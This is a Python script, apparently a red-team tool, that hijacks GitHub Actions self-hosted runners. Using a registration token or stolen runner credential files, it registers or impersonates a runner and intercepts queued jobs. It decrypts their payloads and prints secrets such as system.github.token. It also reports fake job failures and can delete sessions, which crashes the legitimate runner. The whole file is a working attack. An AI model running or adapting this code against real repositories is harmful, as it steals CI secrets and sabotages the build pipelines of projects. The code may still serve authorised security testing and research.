"""
Hijack GitHub runners

Usage:
    gh-hijack-runner.py [options] --registration-token <token> --url <url> [--labels <labels> --ephemeral --rsa-params <rsa> --credentials <credentials> --runner <runner>]
    gh-hijack-runner.py [options] --rsa-params <rsa> --credentials <credentials> --runner <runner> [(--session-id <session> --aes-key <key>)]
    gh-hijack-runner.py [options] --rsa-params <rsa> --credentials <credentials> --runner <runner> --delete-session-id <session>
    

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    --output <folder>                       Save data to output file
    --runer-name <name>                     Runner name
    --runner-group <name>                   Runner group name
    --last-Message-id <id>                  Last message ID

Args:
    --registration-token <token>            Token used to register a runner
    --url <url>                             Full repository or org URL
    --rsa-params <rsa>                      Path to .credentials_rsaparams file
    --credentials <credentials>             Path to .credentials file
    --runner <runner>                       Path to .runner file
    --session-id <session>                  Already running session id
    --aes-key <key>                         Base64 encoded AES key associated with a session id
    --labels <labels>                       Labels used for registration (ubuntu-latest,customrunner)
    --ephemeral                             Create ephemeral runner
    --delete-session-id <session>           Delete session. Warning: It will crash the related GitHub runner
    

Examples:
    $ gh-hijack-runner.py --registration-token AOTAA3TOI7SACAVKBDWEQN3F5IEO2 --url https://github.com/org/repo
    $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json

Author: @hugow
"""

from docopt import docopt
import requests
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes, inverse
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import SHA256
import json
from base64 import b64decode, b64encode, urlsafe_b64decode
from binascii import hexlify
import jwt
import uuid
from datetime import datetime, timedelta, timezone
from os import makedirs
from os.path import exists, isfile
import sys

requests.packages.urllib3.disable_warnings()
GH_API_URL = "https://api.github.com"

HEADERS = {
    "User-Agent": "GitHubActionsRunner-linux-x64/2.314.1 HttpProxyConfigured/True CommitSHA/976290d966e6cc3e748a49bf8fdbe139ff764201",
    "Content-Type": "application/json; charset=utf-8; api-version=6.0-preview.2",
    "Accept": "application/json; api-version=6.0-preview.2"
}

VERBOSE = False

class Hijack:

    _session = None
    registrationToken = None
    gitHubUrl = None
    _rsaKey = None
    _authorizationUrl = None
    _clientId = None
    _accessToken = None
    serverUrl = None
    sessionId = None
    _aesKey = None
    runnerName = "runner"
    runnerGroupName = "Default"
    _runnerPoolId = None
    lastMessageId = 0
    _logToken = None
    _logUrl = None
    rsaparamsFile = "credentials_rsaparams.json"
    credentialsFile = "credentials.json"
    runnerFile = "runner.json"
    outputFolder = None
    labels = None
    ephemeral = False

    def __init__(self):
        self._session = requests.Session()
        self._session.headers.update(HEADERS)
        self._session.verify = False

    def initRegistration(self):
        
        self.serverUrl, token = self.getInitialAccessToken()
        
        if token == None:
            return False

        self.getRunnerGroupsId(token)
        if self._runnerPoolId == None:
            print("[+] Fail to find a runner pool.")
            return False
            
        return self.registerRunner(self.serverUrl, token)


    def generateRSAKey(self):
        key = RSA.generate(2048)
        self._rsaKey = key

    def importRSAKey(self):

        with open(self.rsaparamsFile, "r") as f:
            rsa_params = json.load(f)
        rsa_params = {k: int(hexlify(b64decode(v)), 16) for k, v in rsa_params.items()}
        key = RSA.construct((rsa_params["modulus"], rsa_params["exponent"], rsa_params["d"], rsa_params["p"], rsa_params["q"]))

        f.close()

        self._rsaKey = key

    def importCredentials(self):
        with open(self.credentialsFile, "r") as f:
            credentials = json.load(f)

        self._clientId = credentials.get("data").get("clientId")
        self._authorizationUrl = credentials.get("data").get("authorizationUrl")

    def importRunner(self):
        with open(self.runnerFile, "r") as f:
            runner = json.load(f)

        self.serverUrl = runner.get("serverUrl")
        self.runnerName = runner.get("agentName")
        self.gitHubUrl = runner.get("gitHubUrl")
        self._runnerPoolId = runner.get("poolId")

    def exportRunner(self):

        runner = {
            "agentName": self.runnerName,
            "serverUrl": self.serverUrl,
            "gitHubUrl": self.gitHubUrl,
            "poolId": self._runnerPoolId
        }

        # Convert to JSON
        json_runner = json.dumps(runner, indent=2)

        with open(self.runnerFile, "w") as f:
            f.writelines(json_runner)
        f.close()


    def exportRSAKey(self):

        rsa_components = {
            "modulus": b64encode(long_to_bytes(self._rsaKey.n)).decode("utf-8"),
            "exponent": b64encode(long_to_bytes(self._rsaKey.e)).decode("utf-8"),
            "d": b64encode(long_to_bytes(self._rsaKey.d)).decode("utf-8"),
            "p": b64encode(long_to_bytes(self._rsaKey.p)).decode("utf-8"),
            "q": b64encode(long_to_bytes(self._rsaKey.q)).decode("utf-8"),
            "dp": b64encode(long_to_bytes((self._rsaKey.d % (self._rsaKey.p - 1)))).decode("utf-8"),
            "dq": b64encode(long_to_bytes(self._rsaKey.d % (self._rsaKey.q - 1))).decode("utf-8"),
            "inverseQ": b64encode(long_to_bytes(inverse(self._rsaKey.q, self._rsaKey.p))).decode("utf-8")
        }

        # Convert to JSON
        json_rsa_components = json.dumps(rsa_components, indent=2)

        with open(self.rsaparamsFile, "w") as f:
            f.writelines(json_rsa_components)
        f.close()
    
    def exportCredentials(self):

        credentials = {
            "scheme": "OAuth",
            "data": {
                "clientId": self._clientId,
                "authorizationUrl": self._authorizationUrl,
                "requireFipsCryptography": True
            }
        }

        # Convert to JSON
        json_credentials = json.dumps(credentials, indent=2)

        with open(self.credentialsFile, "w") as f:
            f.writelines(json_credentials)
        f.close()

    def exportComponents(self):
        self.exportCredentials()
        self.exportRSAKey()
        self.exportRunner()

    def importComponents(self):
        self.importCredentials()
        self.importRSAKey()
        self.importRunner()

    def getInitialAccessToken(self):

        data = {
            "url": self.gitHubUrl,
            "runner_event": "register"
        }
        
        self._session.headers.update({"Authorization": f"RemoteAuth {self.registrationToken}"})

        res = self._session.post(f"{GH_API_URL}/actions/runner-registration", json=data)

        if res.status_code == 200:
            url = res.json().get("url")
            token = res.json().get("token")
            #print(f"[+] server url: {url}")
            return url, token
        return None, None
    
    def getRunnerGroupsId(self, token):

        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json; api-version=5.1-preview.1"
        }

        url = f"{self.serverUrl}_apis/distributedtask/pools?poolType=Automation"
        res = self._session.get(url, headers=headers)

        if res.status_code == 200:
            for runnerGroup in res.json().get("value"):
                if runnerGroup.get("name") == self.runnerGroupName:
                    self._runnerPoolId = runnerGroup.get("id")

        return None

    def registerRunner(self, url, token, update=False):

        defaultLables = [
            {
                "id": 0,
                "name": "self-hosted",
                "type": "system"
            },
            {
                "id": 0,
                "name": "Linux",
                "type": "system"
            },
            {
                "id": 0,
                "name": "X64",
                "type": "system"
            }
        ]

        labels = []
        if self.labels != None:
            for l in self.labels.split(","):
                labels.append({
                    "id": 0,
                    "name": l,
                    "type": "user"
                })
        else:
            labels = defaultLables
        

        self._session.headers.update({"Authorization": f"Bearer {token}"})
        data = { 
            "labels": labels,
            "maxParallelism": 1,
            "createdOn": "0001-01-01T00:00:00",
            "authorization": {
                "publicKey": {
                    "exponent": b64encode(long_to_bytes(self._rsaKey.e)),
                    "modulus": b64encode(long_to_bytes(self._rsaKey.n))
                }
            },
            "id": 0,
            "name": self.runnerName,
            "version": "2.314.1",
            "osDescription": "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)",
            "ephemeral": self.ephemeral,
            "disableUpdate": False,
            "status": 0,
            "provisioningState": "Provisioned"
        }

        if update:
            res = self._session.put(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data)
        else:
            res = self._session.post(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data)

        if res.status_code == 200:
            self._authorizationUrl = res.json().get("authorization").get("authorizationUrl")
            self._clientId = res.json().get("authorization").get("clientId")
            #print(f"[+] clientId: {self._clientId}")
            #print(f"[+] authorizationUrl: {self._authorizationUrl}")
            return True
        elif res.status_code == 409:
            print(f"[+] error: {res.json().get('message')}")
        
        return False


    def getAccessToken(self):

        jwtData = {
            "sub": self._clientId,
            "jti": str(uuid.uuid4()),
            "iss": self._clientId,
            "aud": self._authorizationUrl,
            "exp": datetime.now(tz=timezone.utc) + timedelta(minutes=4),
            "nbf": datetime.now(tz=timezone.utc)
        }

        runnerJWT = jwt.encode(jwtData, self._rsaKey.export_key(), algorithm="RS256")

        data = {
            "grant_type": "client_credentials",
            "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            "client_assertion": runnerJWT
        }

        headers = {
            "Accept": "application/json"
        }

        res = requests.post(self._authorizationUrl, data=data, headers=headers, verify=False)

        if res.status_code == 200:
            self._accessToken = res.json().get("access_token")
            self._session.headers.update({"Authorization": f"Bearer {self._accessToken}"})

    def initSession(self, sessionId, aesKey):

        if self.startSession():
            return True
        elif sessionId and aesKey != None:
            self.importSession(sessionId, aesKey)
            print("[+] Session initialized.")
            return True
        return False
    
    def deleteSession(self, sessionId):

        headers = {
            "Content-Type": "application/json; charset=utf-8; api-version=6.0-preview.1",
            "Accept": "application/json; api-version=6.0-preview.1"
        }

        res = self._session.delete(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions/{sessionId}", headers=headers)
        if res.status_code ==  202 or res.status_code == 200:
            print(f"[+] Session {sessionId} deleted.")
            return True
        else:
            print(f"[+] Fail to delete session {sessionId}.")
            return False

    def startSession(self):

        # === is because it's ok to have more padding
        data = json.loads(urlsafe_b64decode(self._accessToken.split(".")[1] + "==="))

        data = {
            "sessionId": "00000000-0000-0000-0000-000000000000",
            "ownerName": "6f67d7490611",
            "agent": {
                "id": int(data.get("runner_id")),
                "name": data.get("runner_name"),
                "version": "2.314.1",
                "osDescription": "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)",
                "ephemeral": None,
                "status": 0,
                "provisioningState": None
            },
            "useFipsEncryption": False
        }

        self._session.headers.update({"Accept": "application/json; api-version=5.1-preview.1"})

        res = self._session.post(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions", json=data)

        if res.status_code == 200:
            self.sessionId = res.json().get("sessionId")
            b64AESKey = res.json().get("encryptionKey").get("value")
            aes_key = b64decode(b64AESKey)
            self._aesKey = self.decryptDataRSA(aes_key)

            print(f"[+] Session ID: {self.sessionId}")
            print(f"[+] AES key: {b64AESKey}")

            return True
        
        elif res.status_code == 409:
            msg = res.json().get("message")
            print(f"[+] Error during session initialization: {msg}")
        
        else:
            print(f"[+] Error during session initialization.")

        return False
    
    def importSession(self, sessionId, b64AESKey):
        self.sessionId =sessionId
        aes_key = b64decode(b64AESKey)
        self._aesKey = self.decryptDataRSA(aes_key)

    def decryptDataRSA(self, data):
        key = PKCS1_OAEP.new(self._rsaKey, hashAlgo=SHA256)

        return key.decrypt(data)
    
    def decryptAES(self, iv, data):
        aes_decrypter = AES.new(self._aesKey, AES.MODE_CBC, iv=iv)
        return unpad(aes_decrypter.decrypt(data),16)
    
    def getMessage(self):

        self._session.headers.update({"User-Agent": "VSServices/2.314.1.0 (NetStandard; Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04]) GitHubActionsRunner-linux-x64/2.314.1 HttpProxyConfigured/True ClientId/4e076e36-5d7a-4c37-8729-b83bcdc89888 RunnerId/28 GroupId/1 CommitSHA/976290d966e6cc3e748a49bf8fdbe139ff764201 (Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04])"})
        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages?sessionId={self.sessionId}&status=Online&runnerVersion=2.314.1&os=Linux&architecture=X64&disableUpdate=false&lastMessageId={self.lastMessageId}"
        res = self._session.get(url, timeout=60)

        if res.status_code == 200:

            if res.json().get("messageType", None) != "PipelineAgentJobRequest":
                return json.loads(res.json().get("body", {}))
            
            else:
                messageId = res.json().get("messageId")

                iv = b64decode(res.json().get("iv"))
                body = b64decode(res.json().get("body"))
                
                decryptedBody = json.loads(self.decryptAES(iv, body))

                jobDisplayName = decryptedBody.get("jobDisplayName")
                print(f"[+] New Job: {jobDisplayName} (messageId={messageId})")
                
                if VERBOSE:
                    print(f"[+] Message body:")
                    print(decryptedBody)
                
                self._logToken = decryptedBody.get("resources").get("endpoints")[0].get("authorization").get("parameters").get("AccessToken")
                self._logUrl = decryptedBody.get("resources").get("endpoints")[0].get("url")
                return decryptedBody
        
        if res.status_code == 403:
            print("[+] Error while getting messages got 403.")
        
        return None

    def deleteMesssageFromPool(self, messageId):
        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages/{messageId}?sessionId={self.sessionId}"
        self._session.delete(url)

    def jobRequestPatch(self, body):
        requestId = int(body.get('requestId'))
        data = {"requestId":requestId,"data":{}}
        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/jobrequests/{requestId}?lockToken=00000000-0000-0000-0000-000000000000"
        res = self._session.patch(url, json=data)


    def returnTaskError(self, sessionRes, body):


        start = datetime.utcnow()
        stop = datetime.utcnow() + timedelta(seconds=4)

        data = {
            "value": [
                {
                    "id": body.get("jobId"),
                    "parentId": None,
                    "type": "Job",
                    "name": body.get("jobDisplayName"),
                    "startTime": start.strftime('%Y-%m-%dT%H:%M:%S.%fZ'),
                    "finishTime": stop.strftime('%Y-%m-%dT%H:%M:%S.%fZ'),
                    "currentOperation": None,
                    "percentComplete": 100,
                    "state": "completed",
                    "result": "failed",
                    "resultCode": None,
                    "changeId": 0,
                    "lastModified": "0001-01-01T00:00:00",
                    "workerName": self.runnerName,
                    "refName": body.get("jobName"),
                    "log": {
                        "id": 5,
                        "location": None
                    },
                    "details": None,
                    "errorCount": 1,
                    "warningCount": 0,
                    "noticeCount": 0,
                    "issues": [
                        {
                            "type": "error",
                            "category": None,
                            "message": "Process completed with exit code 127.",
                            "data": {
                                "stepNumber": "1",
                                "logFileLineNumber": "0"
                            },
                            "isInfrastructureIssue": True
                        }
                    ],
                    "variables": {},
                    "location": None,
                    "previousAttempts": [],
                    "attempt": 1,
                    "identifier": None
                }
            ],
            "count": 1
        }

        planId = body.get('plan').get('planId')
        url = f"{self._logUrl}00000000-0000-0000-0000-000000000000/_apis/distributedtask/hubs/Actions/plans/{planId}/timelines/{planId}/records"

        
        res = sessionRes.patch(url, json=data)

    def returnJobError(self, sessionRes, body):

        data = {
            "requestId": body.get("requestId"),
            "result": "failed",
            "outputs": {},
            "actionsEnvironment": {
                "name": "PROD",
                "url": None
            },
            "name": "JobCompleted",
            "jobId": body.get("jobId")
        }

        planId = body.get('plan').get('planId')
        url = f"{self._logUrl}00000000-0000-0000-0000-000000000000/_apis/distributedtask/hubs/Actions/plans/{planId}/events"
        
        res = sessionRes.post(url, json=data)

    def returnError(self, body):
        
        sessionRes = requests.Session()

        orchestrationId = body.get('plan').get('planId')
        headers = {
            "Accept": "application/json; api-version=5.1-preview.1",
            "User-Agent": f"VSServices/2.314.1.0 (NetStandard; Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04]) GitHubActionsRunner-linux-x64/2.314.1 HttpProxyConfigured/True ClientId/{self._clientId} GroupId/{self._runnerPoolId} OrchestrationId/{orchestrationId}.init.__default (Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04])"
        }

        sessionRes.headers.update(headers)        
        sessionRes.headers.update({"Authorization": f"Bearer {self._logToken}"})
        sessionRes.verify = False

        #self.jobRequestPatch(body)
        self.returnTaskError(sessionRes, body)
        self.returnJobError(sessionRes, body)

    def saveBody(self, body):

        with open(f"{self.outputFolder}/{self.runnerName}-{self.lastMessageId}.json", "w") as f:
            f.writelines(json.dumps(body))
        f.close()

    def renewAccessToken(self):

        data = jwt.get_decoded_payload = jwt.decode(self._accessToken, options={"verify_signature": False})
        exp = datetime.fromtimestamp(int(data.get("exp")))

        if  datetime.now() > (exp + timedelta(minutes=5)):
            self.getAccessToken()

    def displayVariables(self, body):

        variables = body.get("variables")
        for key in variables:

            if key == "system.github.token":
                print(f"- system.github.token: {variables.get(key).get('value')}")

            if not key.startswith(("system.", "Actions.", "DistributedTask.", "build.", "System.")): 
                print(f"- {key}: {variables.get(key).get('value')}")

if __name__ == "__main__":

    args = docopt(__doc__)

    if args["--verbose"]:
        VERBOSE = True

    hijack = Hijack()

    if args["--rsa-params"]:
        hijack.rsaparamsFile = args["--rsa-params"]

    if args["--credentials"]:
        hijack.credentialsFile = args["--credentials"]

    if args["--runner"]:
        hijack.runnerFile = args["--runner"]

    if args["--url"]:
        hijack.gitHubUrl = args["--url"]

    if args["--registration-token"]:
        hijack.registrationToken = args["--registration-token"]

    if args["--output"]:
        if not isfile(args["--output"]):
            hijack.outputFolder = args["--output"]
            makedirs(hijack.outputFolder, exist_ok=True)
        else:
            print("[+] Output must be a folder.")
        

    if args["--runer-name"]:
        hijack.runnerName = args["--runer-name"]

    if args["--runner-group"]:
        hijack.runnerGroupName = args["--runner-group"]

    if args["--last-Message-id"]:
        hijack.lastMessageId = int(args["--last-Message-id"])

    if args["--labels"]:
        hijack.labels = args["--labels"]
    
    if args["--ephemeral"]:
        hijack.ephemeral = True

    if args["--registration-token"]:

        hijack.generateRSAKey()

        if hijack.initRegistration():

            hijack.exportComponents()

        else:
            print("[+] Fail to register runner.")
            sys.exit(1)

    else:
        hijack.importComponents()


    hijack.getAccessToken()
    if args["--delete-session-id"]:
        hijack.deleteSession(args["--delete-session-id"])
        sys.exit(1)

    elif not hijack.initSession(args["--session-id"], args["--aes-key"]):
        sys.exit(1)

    while True:
        
        try:

            body = hijack.getMessage()
            if body:

                if body.get("jobId"):
                    hijack.deleteMesssageFromPool(hijack.lastMessageId)
                    hijack.returnError(body)

                    hijack.displayVariables(body)
                    
                    if hijack.outputFolder != None:
                        hijack.saveBody(body)

                    if hijack.ephemeral:
                        sys.exit(0)
                    hijack.renewAccessToken()

                hijack.lastMessageId += 1

        except requests.exceptions.ReadTimeout as e:
            continue
        except KeyboardInterrupt as e:
            sys.exit(1)